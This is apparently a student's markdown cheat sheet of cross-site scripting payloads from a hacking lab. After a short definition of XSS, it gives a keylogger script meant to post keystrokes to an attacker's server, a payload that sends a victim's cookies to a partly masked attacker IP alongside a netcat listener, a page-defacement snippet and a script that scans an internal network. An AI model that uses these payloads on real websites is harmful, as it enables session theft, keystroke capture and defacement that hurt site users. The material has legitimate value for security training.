# XSS
## Basics 
- Cross-site scripting (XSS) is a security vulnerability typically found in web applications. Its a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.
- A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS.

## Stored XX
### Key Logger
````
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
````
### Chat Room XSS
- Start a netcat listener on your attack box
````
nc -nlvp 4444
````
- Take this XSS payload and paste it in the chat room and submit:
````
<script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
````
- Note: Send the payload and then open the listener 
## Stored XSS Payloads
- Stored XSS pop up to display your cookies, good for a POC
````
<script>alert(document.cookie)</script>
````
- Adding HTML to a website
````
<title>Example document: XSS Doc</title>
````
- Deface website title. You will need inspect element and find the name of the element you want to change. `thm-title` is the element name in this example.
````
<script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>
````
## DOM-Based XSS
- Script to scan and internal network
````
 <script>
 for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i

  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
 }
</script> 
````


























































